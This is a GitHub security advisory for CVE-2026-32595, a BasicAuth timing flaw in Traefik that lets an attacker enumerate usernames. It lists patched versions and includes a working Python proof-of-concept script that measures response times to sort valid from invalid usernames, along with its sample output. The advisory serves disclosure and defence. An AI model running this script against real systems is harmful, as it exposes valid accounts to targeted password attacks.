# [M] Traefik Affected by BasicAuth Middleware Timing Attack Allows Username Enumeration

## Summary
Severity: Medium
Advisory: GHSA-g3hg-j4jv-cwfr
CVE: CVE-2026-32595
CWE: CWE-208
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-g3hg-j4jv-cwfr
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik` — affected >=0
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.41
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.11
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.0-ea.2

## Details
## Summary

There is a potential vulnerability in Traefik's BasicAuth middleware that allows username enumeration via a timing attack.

When a submitted username exists, the middleware performs a bcrypt password comparison taking ~166ms. When the username does not exist, the response returns immediately in ~0.6ms. This ~298x timing difference is observable over the network and allows an unauthenticated attacker to reliably distinguish valid from invalid usernames.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.41
- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary
A timing attack vulnerability exists in Traefik's BasicAuth middleware that allows unauthenticated attackers to enumerate valid usernames. When a username exists, bcrypt password verification takes ~166ms; when it doesn't exist, the response returns immediately in ~0.6ms. This ~298x timing difference enables reliable username enumeration.

### Details
The vulnerability exists in the BasicAuth middleware implementation. When validating credentials:
- User exists: The system performs bcrypt password comparison, which intentionally takes ~100-200ms due to bcrypt's design
- User doesn't exist: The system immediately returns authentication failure in ~0.6ms

This timing difference is observable over the network and allows attackers to distinguish between valid and invalid usernames.

Root Cause: The code returns early when the user is not found, without performing a dummy bcrypt comparison to maintain constant-time execution.

Expected behavior: The system should perform a bcrypt comparison regardless of whether the user exists, to maintain consistent response times.

### PoC
Environment:
- Traefik v3.6.9
- k3s v1.34.5

Configuration:
```yaml
apiVersion: traefik.io/v1alpha1
kind: Middleware
metadata:
  name: basicauth
  namespace: traefik-poc
spec:
  basicAuth:
    secret: basic-auth-secret
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: test-basicauth
  annotations:
    traefik.ingress.kubernetes.io/router.middlewares: traefik-poc-basicauth@kubernetescrd
spec:
  ingressClassName: traefik
  rules:
    - http:
        paths:
          - path: /protected
            pathType: Prefix
            backend:
              service:
                name: whoami
                port:
                  number: 80
```

PoC Script:
```python
#!/usr/bin/env python3
import requests
import time
import statistics
import sys
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:30080/protected"
TEST_USERS = ["admin", "root", "test", "nonexistent12345"]
SAMPLES = 20
def measure_time(username, password="wrongpassword"):
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter()
        requests.get(TARGET, auth=(username, password), timeout=5)
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return statistics.median(times)
print(f"Target: {TARGET}")
print(f"Samples per user: {SAMPLES}\n")
for user in TEST_USERS:
    median = measure_time(user)
    if median > 0.05:  # bcrypt threshold
        status = "[+] EXISTS (slow - bcrypt verification)"
    else:
        status = "[-] NOT FOUND (fast - immediate return)"
    print(f"{status}: {user:20s} | median={median:.4f}s")
```

Execution Results:
```
Target: http://10.10.10.7:30080/protected
Samples per user: 20

[+] EXISTS (slow - bcrypt verification): admin         | median=0.1665s
[-] NOT FOUND (fast - immediate return): root          | median=0.0006s
[-] NOT FOUND (fast - immediate return): test          | median=0.0006s
[-] NOT FOUND (fast - immediate return): nonexistent   | median=0.0006s

Timing difference ratio: 298.0x
```

### Impact
- **Vulnerability Type:** Information Disclosure via Timing Attack (CWE-208)
- **Impact:**
  - Attackers can enumerate valid usernames without authentication
  - Enables targeted password brute-force attacks against confirmed accounts
  - Exposes information about system user structure
- **Who is impacted:** All users of Traefik's BasicAuth middleware are affected. The vulnerability requires:
  - BasicAuth middleware enabled
  - Attacker able to make requests to protected endpoints
  - Network access to measure response times
- **Attack Complexity:** Low - only requires sending HTTP requests and measuring response times
- **Privileges Required:** None
- **User Interaction:** None

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-g3hg-j4jv-cwfr
- https://nvd.nist.gov/vuln/detail/CVE-2026-32595
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.41
- https://github.com/traefik/traefik/releases/tag/v3.6.11
- https://github.com/traefik/traefik/releases/tag/v3.7.0-ea.2
